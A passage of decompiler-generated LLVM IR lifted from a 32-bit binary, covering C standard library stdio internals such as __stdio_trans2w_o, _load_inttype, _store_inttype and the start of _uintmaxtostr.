  %v1_8051543 = icmp eq i1 %v13_8051539, false
  %v2_8051563 = sub i32 %v3_8051540, %v3_805153d
  store i32 %v2_8051563, i32* %eax.global-to-local, align 4
  br i1 %v1_8051543, label %dec_label_pc_8051563, label %dec_label_pc_8051545

dec_label_pc_8051545:                             ; preds = %dec_label_pc_8051539
  %tmp22 = icmp ult i32 %v2_8051563, %arg2
  br i1 %tmp22, label %dec_label_pc_805154d, label %dec_label_pc_805154f

dec_label_pc_805154d:                             ; preds = %dec_label_pc_8051545
  br label %dec_label_pc_805154f

dec_label_pc_805154f:                             ; preds = %dec_label_pc_8051545, %dec_label_pc_805154d
  %storemerge = phi i32 [ %v2_8051563, %dec_label_pc_805154d ], [ %arg2, %dec_label_pc_8051545 ]
  %v0_8051550 = phi i32 [ %v2_8051563, %dec_label_pc_805154d ], [ %arg2, %dec_label_pc_8051545 ]
  store i32 %storemerge, i32* @esi, align 4
  %v3_8051553 = inttoptr i32 %v3_805153d to i16*
  %v4_8051553 = call i32 @memcpy(i16* %v3_8051553, i32 %v0_8051550, i32 %v2_8051563)
  store i32 %v4_8051553, i32* %eax.global-to-local, align 4
  %v0_8051558 = load i32, i32* @ebx, align 4
  %v1_8051558 = add i32 %v0_8051558, 16
  %v2_8051558 = inttoptr i32 %v1_8051558 to i32*
  %v3_8051558 = load i32, i32* %v2_8051558, align 4
  %v4_8051558 = load i32, i32* @esi, align 4
  %v5_8051558 = add i32 %v4_8051558, %v3_8051558
  store i32 %v5_8051558, i32* %v2_8051558, align 4
  br label %dec_label_pc_8051602

dec_label_pc_8051563:                             ; preds = %dec_label_pc_8051539
  %v6_8051567 = icmp ult i32 %v2_8051563, %arg2
  br i1 %v6_8051567, label %dec_label_pc_80515d1, label %dec_label_pc_8051569

dec_label_pc_8051569:                             ; preds = %dec_label_pc_8051563
  %v0_8051569 = load i32, i32* @ecx, align 4
  %v3_805156d = inttoptr i32 %v3_805153d to i16*
  %v4_805156d = call i32 @memcpy(i16* %v3_805156d, i32 %arg2, i32 %v0_8051569)
  store i32 %v4_805156d, i32* %eax.global-to-local, align 4
  %v0_8051572 = load i32, i32* @ebx, align 4
  %v1_8051572 = add i32 %v0_8051572, 16
  %v2_8051572 = inttoptr i32 %v1_8051572 to i32*
  %v3_8051572 = load i32, i32* %v2_8051572, align 4
  %v4_8051572 = load i32, i32* @edi, align 4
  %v5_8051572 = add i32 %v4_8051572, %v3_8051572
  store i32 %v5_8051572, i32* %v2_8051572, align 4
  %v0_8051578 = load i32, i32* @ebx, align 4
  %v1_8051578 = add i32 %v0_8051578, 1
  %v2_8051578 = inttoptr i32 %v1_8051578 to i8*
  %v3_8051578 = load i8, i8* %v2_8051578, align 1
  %v4_8051578 = urem i8 %v3_8051578, 2
  %v5_8051578 = icmp eq i8 %v4_8051578, 0
  br i1 %v5_8051578, label %dec_label_pc_8051602, label %dec_label_pc_8051582

dec_label_pc_8051582:                             ; preds = %dec_label_pc_8051569
  %v0_8051582 = load i32, i32* @edx, align 4
  %v0_8051583 = load i32, i32* @edi, align 4
  %v4_8051587 = call i32 @memrchr(i8 10, i32 %v0_8051583, i32 %v0_8051582)
  store i32 %v4_8051587, i32* %eax.global-to-local, align 4
  %v1_805158f = icmp eq i32 %v4_8051587, 0
  br i1 %v1_805158f, label %dec_label_pc_8051602, label %dec_label_pc_8051593

dec_label_pc_8051593:                             ; preds = %dec_label_pc_8051582
  %v0_8051596 = load i32, i32* @ebx, align 4
  %v1_8051597 = call i32 @__stdio_wcommit(i32 %v0_8051596)
  store i32 %v1_8051597, i32* %eax.global-to-local, align 4
  %v1_805159f = icmp eq i32 %v1_8051597, 0
  br i1 %v1_805159f, label %dec_label_pc_8051602, label %dec_label_pc_80515a3

dec_label_pc_80515a3:                             ; preds = %dec_label_pc_8051593
  %v0_80515a3 = load i32, i32* @edi, align 4
  %tmp23 = icmp ugt i32 %v0_80515a3, %v1_8051597
  br i1 %tmp23, label %dec_label_pc_80515a9, label %dec_label_pc_80515ab

dec_label_pc_80515a9:                             ; preds = %dec_label_pc_80515a3
  br label %dec_label_pc_80515ab

dec_label_pc_80515ab:                             ; preds = %dec_label_pc_80515a3, %dec_label_pc_80515a9
  %storemerge24 = phi i32 [ %v1_8051597, %dec_label_pc_80515a9 ], [ %v0_80515a3, %dec_label_pc_80515a3 ]
  %v0_80515b2 = phi i32 [ %v1_8051597, %dec_label_pc_80515a9 ], [ %v0_80515a3, %dec_label_pc_80515a3 ]
  store i32 %storemerge24, i32* %esi.global-to-local, align 4
  %v2_80515ad = sub i32 %v0_80515a3, %v0_80515b2
  store i32 %v2_80515ad, i32* %eax.global-to-local, align 4
  %v0_80515af = load i32, i32* @ebp, align 4
  %v2_80515af = add i32 %v0_80515af, %v2_80515ad
  store i32 %v2_80515af, i32* %ebp.global-to-local, align 4
  %v4_80515b6 = call i32 @__GI_memchr(i8* inttoptr (i32 10 to i8*), i32 %v0_80515b2, i32 %v2_80515ad)
  store i32 %v4_80515b6, i32* %eax.global-to-local, align 4
  store i32 %v4_80515b6, i32* @edx, align 4
  %v1_80515c0 = icmp eq i32 %v4_80515b6, 0
  br i1 %v1_80515c0, label %dec_label_pc_8051602, label %dec_label_pc_80515c4

dec_label_pc_80515c4:                             ; preds = %dec_label_pc_80515ab
  %v0_80515c4 = load i32, i32* %ebp.global-to-local, align 4
  %v1_80515c4 = load i32, i32* %esi.global-to-local, align 4
  %v2_80515c4 = sub i32 %v0_80515c4, %v4_80515b6
  %v2_80515c8 = add i32 %v2_80515c4, %v1_80515c4
  store i32 %v2_80515c8, i32* %eax.global-to-local, align 4
  %v0_80515ca = load i32, i32* @ebx, align 4
  %v1_80515ca = add i32 %v0_80515ca, 16
  %v2_80515ca = inttoptr i32 %v1_80515ca to i32*
  %v3_80515ca = load i32, i32* %v2_80515ca, align 4
  %v5_80515ca = sub i32 %v3_80515ca, %v2_80515c8
  store i32 %v5_80515ca, i32* %v2_80515ca, align 4
  %v0_80515cd = load i32, i32* @edi, align 4
  %v1_80515cd = load i32, i32* %eax.global-to-local, align 4
  %v2_80515cd = sub i32 %v0_80515cd, %v1_80515cd
  store i32 %v2_80515cd, i32* @edi, align 4
  br label %dec_label_pc_8051602

dec_label_pc_80515d1:                             ; preds = %dec_label_pc_8051563
  %v2_80515d1 = add i32 %arg3, 8
  %v3_80515d1 = inttoptr i32 %v2_80515d1 to i32*
  %v4_80515d1 = load i32, i32* %v3_80515d1, align 4
  %v15_80515d1 = icmp eq i32 %v3_805153d, %v4_80515d1
  br i1 %v15_80515d1, label %dec_label_pc_80515ea, label %dec_label_pc_80515d6

dec_label_pc_80515d6:                             ; preds = %dec_label_pc_80515d1
  %v1_80515da = call i32 @__stdio_wcommit(i32 %arg3)
  store i32 %v1_80515da, i32* %eax.global-to-local, align 4
  %v1_80515e2 = icmp eq i32 %v1_80515da, 0
  br i1 %v1_80515e2, label %dec_label_pc_80515d6.dec_label_pc_80515ea_crit_edge, label %dec_label_pc_80515e6

dec_label_pc_80515d6.dec_label_pc_80515ea_crit_edge: ; preds = %dec_label_pc_80515d6
  %v0_80515ea.pre = load i32, i32* @edi, align 4
  %v0_80515f2.pre = load i32, i32* @ebx, align 4
  %v2_80515f9.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_80515ea

dec_label_pc_80515e6:                             ; preds = %dec_label_pc_80515d6
  store i32 0, i32* @edi, align 4
  br label %dec_label_pc_8051602

dec_label_pc_80515ea:                             ; preds = %dec_label_pc_80515d6.dec_label_pc_80515ea_crit_edge, %dec_label_pc_80515d1, %entry
  %v2_80515f9 = phi i32 [ %v2_80515f9.pre, %dec_label_pc_80515d6.dec_label_pc_80515ea_crit_edge ], [ %v0_805151f, %dec_label_pc_80515d1 ], [ %v0_805151f, %entry ]
  %v0_80515f2 = phi i32 [ %v0_80515f2.pre, %dec_label_pc_80515d6.dec_label_pc_80515ea_crit_edge ], [ %arg3, %dec_label_pc_80515d1 ], [ %arg3, %entry ]
  %v0_80515ea = phi i32 [ %v0_80515ea.pre, %dec_label_pc_80515d6.dec_label_pc_80515ea_crit_edge ], [ %arg2, %dec_label_pc_80515d1 ], [ %arg2, %entry ]
  store i32 %v2_80515f9, i32* @ebx, align 4
  store i32 %v0_805151d, i32* @edi, align 4
  %v4_80515fd = inttoptr i32 %v0_80515f2 to i16*
  %v5_80515fd = call i32 @__stdio_WRITE(i16* %v4_80515fd, i32 %v0_80515ea, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_80515fd, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051602

dec_label_pc_8051602:                             ; preds = %dec_label_pc_80515ab, %dec_label_pc_8051593, %dec_label_pc_8051582, %dec_label_pc_8051569, %dec_label_pc_80515e6, %dec_label_pc_80515c4, %dec_label_pc_805154f, %dec_label_pc_80515ea
  %v0_8051605 = load i32, i32* @edi, align 4
  store i32 %v0_8051605, i32* %eax.global-to-local, align 4
  %v2_8051607 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8051607, i32* @ebx, align 4
  store i32 %v0_805151e, i32* @esi, align 4
  store i32 %v0_805151d, i32* @edi, align 4
  store i32 %v0_805151c, i32* @ebp, align 4
  ret i32 %v0_8051605

; uselistorder directives
  uselistorder i32 %v2_80515c8, { 1, 0 }
  uselistorder i32 %v4_80515b6, { 0, 2, 1, 3 }
  uselistorder i32 %v2_80515ad, { 1, 0, 2 }
  uselistorder i32 %v0_80515a3, { 3, 0, 1, 2 }
  uselistorder i32 %v2_8051563, { 3, 4, 0, 1, 2, 5 }
  uselistorder i32 %v0_805151d, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32* %esi.global-to-local, { 1, 0 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10 }
  uselistorder i32 ptrtoint (i32* @0 to i32), { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 11, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 38, 39, 35, 36, 37, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 57, 58, 55, 56, 59, 60 }
  uselistorder i8 10, { 12, 0, 1, 2, 3, 13, 4, 14, 5, 15, 6, 7, 8, 9, 10, 11, 16 }
  uselistorder i8 2, { 0, 15, 1, 9, 22, 18, 2, 19, 3, 4, 5, 6, 20, 21, 7, 8, 16, 10, 17, 11, 14, 13, 12 }
  uselistorder i32 %arg3, { 0, 1, 2, 3, 5, 4, 6, 8, 7 }
  uselistorder i32 %arg2, { 4, 5, 6, 3, 0, 1, 2, 7 }
  uselistorder label %dec_label_pc_8051602, { 7, 4, 5, 0, 1, 2, 3, 6 }
  uselistorder label %dec_label_pc_80515ab, { 1, 0 }
  uselistorder label %dec_label_pc_805154f, { 1, 0 }
}

define i32 @__stdio_trans2w_o(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_805160c = load i32, i32* @ebx, align 4
  %v4_8051610 = ptrtoint i16* %arg1 to i32
  store i32 %v4_8051610, i32* @ebx, align 4
  store i32 %arg2, i32* @ecx, align 4
  %v1_8051618 = bitcast i16* %arg1 to i32*
  %v2_8051618 = load i32, i32* %v1_8051618, align 4
  store i32 %v2_8051618, i32* %eax.global-to-local, align 4
  %v1_805161a = urem i32 %v2_8051618, 65536
  store i32 %v1_805161a, i32* %edx.global-to-local, align 4
  %v2_805161d = and i32 %v1_805161a, %arg2
  %v3_805161d = icmp eq i32 %v2_805161d, 0
  %v1_805161f = icmp eq i1 %v3_805161d, false
  br i1 %v1_805161f, label %dec_label_pc_805162e, label %dec_label_pc_8051621

dec_label_pc_8051621:                             ; preds = %entry
  %v1_8051621 = and i32 %v2_8051618, 2176
  %v2_8051621 = icmp eq i32 %v1_8051621, 0
  store i32 %v1_8051621, i32* %edx.global-to-local, align 4
  %v1_8051627 = icmp eq i1 %v2_8051621, false
  br i1 %v1_8051627, label %dec_label_pc_8051636, label %dec_label_pc_8051629

dec_label_pc_8051629:                             ; preds = %dec_label_pc_8051621
  %v2_8051629 = or i32 %v2_8051618, %arg2
  store i32 %v2_8051629, i32* %eax.global-to-local, align 4
  %v1_805162b = trunc i32 %v2_8051629 to i16
  store i16 %v1_805162b, i16* %arg1, align 2
  %v0_805162e.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_805162e

dec_label_pc_805162e:                             ; preds = %entry, %dec_label_pc_8051629
  %v0_8051673 = phi i32 [ %v4_8051610, %entry ], [ %v0_805162e.pre, %dec_label_pc_8051629 ]
  %v1_805162e = inttoptr i32 %v0_8051673 to i16*
  %v2_805162e = load i16, i16* %v1_805162e, align 2
  %v3_805162e = zext i16 %v2_805162e to i32
  store i32 %v3_805162e, i32* %edx.global-to-local, align 4
  %v2_8051631 = and i16 %v2_805162e, 32
  %v3_8051631 = icmp eq i16 %v2_8051631, 0
  br i1 %v3_8051631, label %dec_label_pc_805164a, label %dec_label_pc_8051636

dec_label_pc_8051636:                             ; preds = %dec_label_pc_805162e, %dec_label_pc_8051621
  %v1_8051636 = call i32 @__errno_location(i32 %v0_805160c)
  store i32 %v1_8051636, i32* %eax.global-to-local, align 4
  %v1_805163b = inttoptr i32 %v1_8051636 to i32*
  store i32 9, i32* %v1_805163b, align 4
  br label %dec_label_pc_8051641

dec_label_pc_8051641:                             ; preds = %dec_label_pc_8051661, %dec_label_pc_8051636
  %v0_8051641 = load i32, i32* @ebx, align 4
  %v1_8051641 = inttoptr i32 %v0_8051641 to i16*
  %v2_8051641 = load i16, i16* %v1_8051641, align 2
  %v3_8051641 = or i16 %v2_8051641, 8
  store i16 %v3_8051641, i16* %v1_8051641, align 2
  store i32 -1, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80516a4

dec_label_pc_805164a:                             ; preds = %dec_label_pc_805162e
  %v2_805164a = urem i16 %v2_805162e, 4
  %v3_805164a = icmp eq i16 %v2_805164a, 0
  br i1 %v3_805164a, label %dec_label_pc_8051690, label %dec_label_pc_805164f

dec_label_pc_805164f:                             ; preds = %dec_label_pc_805164a
  %v2_805164f = and i32 %v3_805162e, 4
  %v3_805164f = icmp eq i32 %v2_805164f, 0
  %v1_8051652 = icmp eq i1 %v3_805164f, false
  br i1 %v1_8051652, label %dec_label_pc_8051680, label %dec_label_pc_8051654

dec_label_pc_8051654:                             ; preds = %dec_label_pc_805164f
  %v1_8051654 = add i32 %v0_8051673, 20
  %v2_8051654 = inttoptr i32 %v1_8051654 to i32*
  %v3_8051654 = load i32, i32* %v2_8051654, align 4
  store i32 %v3_8051654, i32* %eax.global-to-local, align 4
  %v2_8051657 = add i32 %v0_8051673, 16
  %v3_8051657 = inttoptr i32 %v2_8051657 to i32*
  %v4_8051657 = load i32, i32* %v3_8051657, align 4
  %v15_8051657 = icmp eq i32 %v3_8051654, %v4_8051657
  %v1_805165a = icmp eq i1 %v15_8051657, false
  br i1 %v1_805165a, label %dec_label_pc_8051661, label %dec_label_pc_805165c

dec_label_pc_805165c:                             ; preds = %dec_label_pc_8051654
  %v2_805165c = and i32 %v3_805162e, 2
  %v3_805165c = icmp eq i32 %v2_805165c, 0
  br i1 %v3_805165c, label %dec_label_pc_8051680, label %dec_label_pc_8051661

dec_label_pc_8051661:                             ; preds = %dec_label_pc_805165c, %dec_label_pc_8051654
  %v1_8051661 = and i32 %v3_805162e, 1024
  store i32 %v1_8051661, i32* %edx.global-to-local, align 4
  %tmp18 = udiv i32 %v1_8051661, 1024
  %tmp19 = xor i32 %tmp18, 3
  store i32 %tmp19, i32* %eax.global-to-local, align 4
  %v5_8051674 = call i32 @__GI_fseek(i32 %v0_8051673, i32 0, i32 %tmp19, i32 %v1_8051661)
  store i32 %v5_8051674, i32* %eax.global-to-local, align 4
  %v1_805167c = icmp eq i32 %v5_8051674, 0
  %v1_805167e = icmp eq i1 %v1_805167c, false
  br i1 %v1_805167e, label %dec_label_pc_8051641, label %dec_label_pc_8051661.dec_label_pc_8051680_crit_edge

dec_label_pc_8051661.dec_label_pc_8051680_crit_edge: ; preds = %dec_label_pc_8051661
  %v0_8051680.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8051680

dec_label_pc_8051680:                             ; preds = %dec_label_pc_8051661.dec_label_pc_8051680_crit_edge, %dec_label_pc_805165c, %dec_label_pc_805164f
  %v10_8051680 = phi i32 [ %v0_8051680.pre, %dec_label_pc_8051661.dec_label_pc_8051680_crit_edge ], [ %v0_8051673, %dec_label_pc_805165c ], [ %v0_8051673, %dec_label_pc_805164f ]
  %v1_8051680 = inttoptr i32 %v10_8051680 to i16*
  %v2_8051680 = load i16, i16* %v1_8051680, align 2
  %v3_8051680 = and i16 %v2_8051680, -4
  store i16 %v3_8051680, i16* %v1_8051680, align 2
  %v0_8051684 = load i32, i32* @ebx, align 4
  %v1_8051684 = add i32 %v0_8051684, 8
  %v2_8051684 = inttoptr i32 %v1_8051684 to i32*
  %v3_8051684 = load i32, i32* %v2_8051684, align 4
  store i32 %v3_8051684, i32* %eax.global-to-local, align 4
  %v2_8051687 = add i32 %v0_8051684, 24
  %v3_8051687 = inttoptr i32 %v2_8051687 to i32*
  store i32 %v3_8051684, i32* %v3_8051687, align 4
  %v0_805168a = load i32, i32* %eax.global-to-local, align 4
  %v1_805168a = load i32, i32* @ebx, align 4
  %v2_805168a = add i32 %v1_805168a, 16
  %v3_805168a = inttoptr i32 %v2_805168a to i32*
  store i32 %v0_805168a, i32* %v3_805168a, align 4
  %v0_805168d = load i32, i32* %eax.global-to-local, align 4
  %v1_805168d = load i32, i32* @ebx, align 4
  %v2_805168d = add i32 %v1_805168d, 20
  %v3_805168d = inttoptr i32 %v2_805168d to i32*
  store i32 %v0_805168d, i32* %v3_805168d, align 4
  %v0_8051690.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8051690

dec_label_pc_8051690:                             ; preds = %dec_label_pc_805164a, %dec_label_pc_8051680
  %v9_8051690 = phi i32 [ %v0_8051673, %dec_label_pc_805164a ], [ %v0_8051690.pre, %dec_label_pc_8051680 ]
  %v1_8051690 = inttoptr i32 %v9_8051690 to i16*
  %v2_8051690 = load i16, i16* %v1_8051690, align 2
  %v3_8051690 = or i16 %v2_8051690, 64
  store i16 %v3_8051690, i16* %v1_8051690, align 2
  store i32 0, i32* %edx.global-to-local, align 4
  %v0_8051696 = load i32, i32* @ebx, align 4
  %v1_8051696 = inttoptr i32 %v0_8051696 to i16*
  %v2_8051696 = load i16, i16* %v1_8051696, align 2
  %v3_8051696 = zext i16 %v2_8051696 to i32
  store i32 %v3_8051696, i32* %eax.global-to-local, align 4
  %v3_8051699 = and i16 %v2_8051696, 2816
  %v4_8051699 = icmp eq i16 %v3_8051699, 0
  %v1_805169c = icmp eq i1 %v4_8051699, false
  br i1 %v1_805169c, label %dec_label_pc_80516a4, label %dec_label_pc_805169e

dec_label_pc_805169e:                             ; preds = %dec_label_pc_8051690
  %v1_805169e = add i32 %v0_8051696, 12
  %v2_805169e = inttoptr i32 %v1_805169e to i32*
  %v3_805169e = load i32, i32* %v2_805169e, align 4
  store i32 %v3_805169e, i32* %eax.global-to-local, align 4
  %v2_80516a1 = add i32 %v0_8051696, 28
  %v3_80516a1 = inttoptr i32 %v2_80516a1 to i32*
  store i32 %v3_805169e, i32* %v3_80516a1, align 4
  %v0_80516a4.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80516a4

dec_label_pc_80516a4:                             ; preds = %dec_label_pc_8051690, %dec_label_pc_8051641, %dec_label_pc_805169e
  %v0_80516a4 = phi i32 [ 0, %dec_label_pc_8051690 ], [ -1, %dec_label_pc_8051641 ], [ %v0_80516a4.pre, %dec_label_pc_805169e ]
  store i32 %v0_80516a4, i32* %eax.global-to-local, align 4
  %v2_80516a6 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80516a6, i32* @edx, align 4
  store i32 %v0_805160c, i32* @ebx, align 4
  ret i32 %v0_80516a4

; uselistorder directives
  uselistorder i32 %v0_80516a4, { 1, 0 }
  uselistorder i32 %v0_8051696, { 1, 0, 2 }
  uselistorder i32 %tmp19, { 1, 0 }
  uselistorder i32 %v1_8051661, { 1, 0, 2 }
  uselistorder i32 %v0_8051673, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i32 %v1_805161a, { 1, 0 }
  uselistorder i32 %v2_8051618, { 1, 2, 0, 3 }
  uselistorder i32 %v0_805160c, { 1, 0 }
  uselistorder i32 1024, { 0, 28, 1, 16, 15, 29, 31, 2, 30, 3, 32, 4, 33, 34, 35, 36, 5, 37, 38, 14, 17, 11, 18, 12, 19, 13, 20, 21, 10, 22, 23, 9, 24, 25, 8, 26, 7, 27, 6, 39, 40 }
  uselistorder i16* %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80516a4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8051690, { 1, 0 }
  uselistorder label %dec_label_pc_805162e, { 1, 0 }
}

define i32 @_load_inttype() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %v5_80516b4 = icmp slt i32 %tmp, 0
  %v3_80516dd = and i32 %tmp5, 2048
  %v4_80516dd = icmp eq i32 %v3_80516dd, 0
  br i1 %v5_80516b4, label %dec_label_pc_80516dd, label %dec_label_pc_80516bb

dec_label_pc_80516bb:                             ; preds = %entry
  %v1_80516be = icmp eq i1 %v4_80516dd, false
  br i1 %v1_80516be, label %dec_label_pc_80516e2, label %dec_label_pc_80516c0

dec_label_pc_80516c0:                             ; preds = %dec_label_pc_80516bb
  %v1_80516c0 = inttoptr i32 %tmp4 to i32*
  %v2_80516c0 = load i32, i32* %v1_80516c0, align 4
  %v6_80516c2 = icmp eq i32 %tmp5, 256
  %v1_80516c8 = icmp eq i1 %v6_80516c2, false
  br i1 %v1_80516c8, label %dec_label_pc_80516cf, label %dec_label_pc_80516ca

dec_label_pc_80516ca:                             ; preds = %dec_label_pc_80516c0
  %v1_80516ca = urem i32 %v2_80516c0, 256
  br label %dec_label_pc_80516da

dec_label_pc_80516cf:                             ; preds = %dec_label_pc_80516c0
  %v6_80516cf = icmp eq i32 %tmp5, 512
  %v1_80516d5 = icmp eq i1 %v6_80516cf, false
  br i1 %v1_80516d5, label %dec_label_pc_80516da, label %dec_label_pc_80516d7

dec_label_pc_80516d7:                             ; preds = %dec_label_pc_80516cf
  %v1_80516d7 = urem i32 %v2_80516c0, 65536
  br label %dec_label_pc_80516da

dec_label_pc_80516da:                             ; preds = %dec_label_pc_80516cf, %dec_label_pc_80516ca, %dec_label_pc_80516d7
  %v0_80516dc = phi i32 [ %v2_80516c0, %dec_label_pc_80516cf ], [ %v1_80516ca, %dec_label_pc_80516ca ], [ %v1_80516d7, %dec_label_pc_80516d7 ]
  store i32 0, i32* @edx, align 4
  ret i32 %v0_80516dc

dec_label_pc_80516dd:                             ; preds = %entry
  br i1 %v4_80516dd, label %dec_label_pc_80516e8, label %dec_label_pc_80516e2

dec_label_pc_80516e2:                             ; preds = %dec_label_pc_80516dd, %dec_label_pc_80516bb
  %v1_80516e2 = add i32 %tmp4, 4
  %v2_80516e2 = inttoptr i32 %v1_80516e2 to i32*
  %v3_80516e2 = load i32, i32* %v2_80516e2, align 4
  store i32 %v3_80516e2, i32* @edx, align 4
  %v1_80516e5 = inttoptr i32 %tmp4 to i32*
  %v2_80516e5 = load i32, i32* %v1_80516e5, align 4
  ret i32 %v2_80516e5

dec_label_pc_80516e8:                             ; preds = %dec_label_pc_80516dd
  %v1_80516e8 = inttoptr i32 %tmp4 to i32*
  %v2_80516e8 = load i32, i32* %v1_80516e8, align 4
  %v6_80516ea = icmp eq i32 %tmp5, 256
  %v1_80516f0 = icmp eq i1 %v6_80516ea, false
  br i1 %v1_80516f0, label %dec_label_pc_80516f7, label %dec_label_pc_80516f2

dec_label_pc_80516f2:                             ; preds = %dec_label_pc_80516e8
  %v1_80516f2 = mul i32 %v2_80516e8, 16777216
  %v2_80516f2 = sdiv i32 %v1_80516f2, 16777216
  br label %dec_label_pc_8051700

dec_label_pc_80516f7:                             ; preds = %dec_label_pc_80516e8
  %v6_80516f7 = icmp eq i32 %tmp5, 512
  %v1_80516fd = icmp eq i1 %v6_80516f7, false
  br i1 %v1_80516fd, label %dec_label_pc_8051700, label %dec_label_pc_80516ff

dec_label_pc_80516ff:                             ; preds = %dec_label_pc_80516f7
  %v1_80516ff = mul i32 %v2_80516e8, 65536
  %v2_80516ff = sdiv i32 %v1_80516ff, 65536
  br label %dec_label_pc_8051700

dec_label_pc_8051700:                             ; preds = %dec_label_pc_80516f7, %dec_label_pc_80516f2, %dec_label_pc_80516ff
  %v0_8051700 = phi i32 [ %v2_80516e8, %dec_label_pc_80516f7 ], [ %v2_80516f2, %dec_label_pc_80516f2 ], [ %v2_80516ff, %dec_label_pc_80516ff ]
  %v1_8051700 = ashr i32 %v0_8051700, 31
  store i32 %v1_8051700, i32* @edx, align 4
  ret i32 %v0_8051700

; uselistorder directives
  uselistorder i32 %v0_8051700, { 1, 0 }
  uselistorder i32 %v2_80516e8, { 2, 0, 1 }
  uselistorder i32 %v2_80516c0, { 2, 0, 1 }
  uselistorder i32 %tmp4, { 0, 2, 1, 3 }
  uselistorder i32 16777216, { 1, 0, 3, 2, 5, 4, 7, 6, 9, 8, 11, 10, 13, 12 }
  uselistorder label %dec_label_pc_8051700, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80516da, { 2, 0, 1 }
}

define i32 @_store_inttype() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i16* @__decompiler_undefined_function_5()
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_8051704 = load i32, i32* @ebx, align 4
  store i32 %v0_8051704, i32* %stack_var_-4, align 4
  store i32 %tmp6, i32* @ecx, align 4
  %v4_8051709 = ptrtoint i16* %tmp5 to i32
  store i32 %v4_8051709, i32* %ebx.global-to-local, align 4
  %v4_805170d = trunc i32 %tmp4 to i16
  %v6_8051715 = icmp eq i32 %tmp6, 256
  %v1_805171b = icmp eq i1 %v6_8051715, false
  br i1 %v1_805171b, label %dec_label_pc_8051721, label %dec_label_pc_805171d

dec_label_pc_805171d:                             ; preds = %entry
  %v2_805171d = trunc i32 %tmp4 to i8
  %v4_805171d = bitcast i16* %tmp5 to i8*
  store i8 %v2_805171d, i8* %v4_805171d, align 1
  br label %dec_label_pc_805173f

dec_label_pc_8051721:                             ; preds = %entry
  %v6_8051721 = icmp eq i32 %tmp6, 2048
  %v1_8051727 = icmp eq i1 %v6_8051721, false
  br i1 %v1_8051727, label %dec_label_pc_8051730, label %dec_label_pc_8051729

dec_label_pc_8051729:                             ; preds = %dec_label_pc_8051721
  %sext2 = mul i32 %tmp4, 65536
  %v1_8051729 = sdiv i32 %sext2, 65536
  %v3_8051729 = bitcast i16* %tmp5 to i32*
  store i32 %v1_8051729, i32* %v3_8051729, align 4
  %v0_805172b = load i32, i32* %edx.global-to-local, align 4
  %v1_805172b = load i32, i32* %ebx.global-to-local, align 4
  %v2_805172b = add i32 %v1_805172b, 4
  %v3_805172b = inttoptr i32 %v2_805172b to i32*
  store i32 %v0_805172b, i32* %v3_805172b, align 4
  br label %dec_label_pc_805173f

dec_label_pc_8051730:                             ; preds = %dec_label_pc_8051721
  %v6_8051730 = icmp eq i32 %tmp6, 512
  %v1_8051736 = icmp eq i1 %v6_8051730, false
  br i1 %v1_8051736, label %dec_label_pc_805173d, label %dec_label_pc_8051738

dec_label_pc_8051738:                             ; preds = %dec_label_pc_8051730
  store i16 %v4_805170d, i16* %tmp5, align 2
  br label %dec_label_pc_805173f

dec_label_pc_805173d:                             ; preds = %dec_label_pc_8051730
  %sext3 = mul i32 %tmp4, 65536
  %v1_805173d = sdiv i32 %sext3, 65536
  %v3_805173d = bitcast i16* %tmp5 to i32*
  store i32 %v1_805173d, i32* %v3_805173d, align 4
  br label %dec_label_pc_805173f

dec_label_pc_805173f:                             ; preds = %dec_label_pc_8051738, %dec_label_pc_8051729, %dec_label_pc_805171d, %dec_label_pc_805173d
  %v2_805173f = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805173f, i32* %ebx.global-to-local, align 4
  %sext = mul i32 %tmp4, 65536
  %v1_8051740 = sdiv i32 %sext, 65536
  ret i32 %v1_8051740

; uselistorder directives
  uselistorder label %dec_label_pc_805173f, { 3, 0, 1, 2 }
}

define i32 @_uintmaxtostr(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v4_805174f = ptrtoint i8* %arg1 to i32
  store i32 %v4_805174f, i32* %edi.global-to-local, align 4
  store i32 %arg2, i32* %ecx.global-to-local, align 4
  store i32 %arg3, i32* %ebx.global-to-local, align 4
  %v2_805175b = icmp slt i32 %arg4, 0
  %v1_805175d = icmp eq i1 %v2_805175b, false
